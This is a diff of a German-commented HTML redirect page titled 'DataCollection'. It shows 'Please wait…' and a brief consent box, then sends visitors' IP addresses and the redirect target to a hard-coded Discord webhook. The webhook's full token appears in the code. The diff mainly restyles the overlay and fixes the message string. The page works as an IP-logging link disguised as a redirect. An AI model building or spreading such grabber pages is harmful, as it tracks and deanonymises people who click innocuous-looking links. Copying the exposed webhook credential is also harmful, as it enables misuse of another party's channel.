@@ -1,79 +1,143 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <title>DataCollection</title>
   <link rel="apple-touch-icon" href="/favicon.png">
   <link rel="icon" type="image/png" sizes="225x225" href="/favicon.png">
   <link rel="icon" href="/favicon.ico">
-    <meta charset="UTF-8">
-    <title>DataCollection</title>
-    <style>
-        #agbBox {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #111;
-            color: #fff;
-            padding: 15px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 420px;
-            font-family: Arial, sans-serif;
-        }
-        button {
-            margin-top: 10px;
-            margin-right: 10px;
-            padding: 6px 12px;
-            cursor: pointer;
-        }
-    </style>
+  <style>
+    /* Body */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e1e2f, #27293d);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    p {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+    }
+
+    /* AGB Overlay */
+    #agbOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    #agbBox {
+      background: #1f1f2e;
+      padding: 25px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+      max-width: 450px;
+      width: 90%;
+      text-align: left;
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    #agbBox h2 {
+      margin-top: 0;
+      margin-bottom: 10px;
+      font-size: 1.3rem;
+      color: #f0f0f0;
+    }
+
+    #agbBox p {
+      font-size: 0.95rem;
+      line-height: 1.4;
+      color: #ccc;
+    }
+
+    button {
+      padding: 8px 18px;
+      margin-top: 15px;
+      margin-right: 10px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    button:hover {
+      opacity: 0.85;
+      transform: scale(1.05);
+    }
+
+    #acceptBtn {
+      background: #4caf50;
+      color: #fff;
+    }
+
+    #declineBtn {
+      background: #f44336;
+      color: #fff;
+    }
+
+    @keyframes fadeIn {
+      from {opacity:0; transform: translateY(20px);}
+      to {opacity:1; transform: translateY(0);}
+    }
+  </style>
 </head>
 <body>
-    <p>Please Wait…</p>
+  <div>
+    <p>Please wait…</p>
+  </div>
 
-    <div id="agbBox" style="display:none;">
-        <b>Terms and Conditions and Privacy Policy</b>
-        <p>
-            This page processes technical data (e.g., IP address) for the purpose of providing functionality.
-        </p>
-        <button onclick="acceptAgb()">Accept</button>
-        <button onclick="declineAgb()">Deny</button>
+  <div id="agbOverlay">
+    <div id="agbBox">
+      <h2>Terms and Conditions & Privacy Policy</h2>
+      <p>This page processes technical data (e.g., IP address) to provide functionality. 
+         By clicking "Accept", you consent to this processing. Click "Deny" to skip.</p>
+      <button id="acceptBtn" onclick="acceptAgb()">Accept</button>
+      <button id="declineBtn" onclick="declineAgb()">Deny</button>
     </div>
+  </div>
 
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050057814573146/fTL6O37dVj0UPkrHSSGC_zEOAS0ExRaO1w4EaCwaRX_MXRlYIod3f-_e_mPvn4zKlsDj";
 
-// Zielseite aus Parameter
+// Zielseite aus Parameter oder Pfad
 const params = new URLSearchParams(window.location.search);
 let gotoAfter = params.get("gotoafter");
-
-// Wenn kein Parameter, dann prüfen, ob Pfad vorhanden
 if (!gotoAfter) {
-    const path = window.location.pathname.split("/").pop(); // letzter Teil des Pfads
+    const path = window.location.pathname.split("/").pop();
     if (path && path !== "index.html") {
         gotoAfter = "https://" + path;
     }
 }
-
-// Fallback
 gotoAfter = gotoAfter || "https://t3102115-cmd.github.io";
 
-// Cookie‑Helfer
+// Cookie-Helfer
 function setCookie(name, value, days = 365) {
     const d = new Date();
     d.setTime(d.getTime() + days*24*60*60*1000);
     document.cookie = `${name}=${value}; expires=${d.toUTCString()}; path=/`;
 }
-
 function getCookie(name) {
     return document.cookie.split("; ").find(row => row.startsWith(name + "="))?.split("=")[1];
 }
 
 // Weiterleitung
 function redirect() {
-    setTimeout(() => {
-        window.location.href = gotoAfter;
-    }, 1500);
+    setTimeout(() => { window.location.href = gotoAfter; }, 1500);
 }
 
 // IP loggen
@@ -85,7 +149,7 @@ function logIp() {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `Visitor accessed your site!\nIP: "${data.ip"}\nGotoAfter: "${gotoAfter}"`
+                    content: `Visitor accessed your site!\nIP: ${data.ip}\nGotoAfter: ${gotoAfter}`
                 })
             });
         })
@@ -95,25 +159,24 @@ function logIp() {
 // AGB Aktionen
 function acceptAgb() {
     setCookie("agb", "accepted");
-    document.getElementById("agbBox").style.display = "none";
+    document.getElementById("agbOverlay").style.display = "none";
     logIp();
 }
 
 function declineAgb() {
     setCookie("agb", "declined");
-    document.getElementById("agbBox").style.display = "none";
+    document.getElementById("agbOverlay").style.display = "none";
     redirect();
 }
 
 // Startlogik
 const agbStatus = getCookie("agb");
-
 if (agbStatus === "accepted") {
     logIp();
 } else if (agbStatus === "declined") {
     redirect();
 } else {
-    document.getElementById("agbBox").style.display = "block";
+    document.getElementById("agbOverlay").style.display = "flex";
 }
 </script>
 </body>
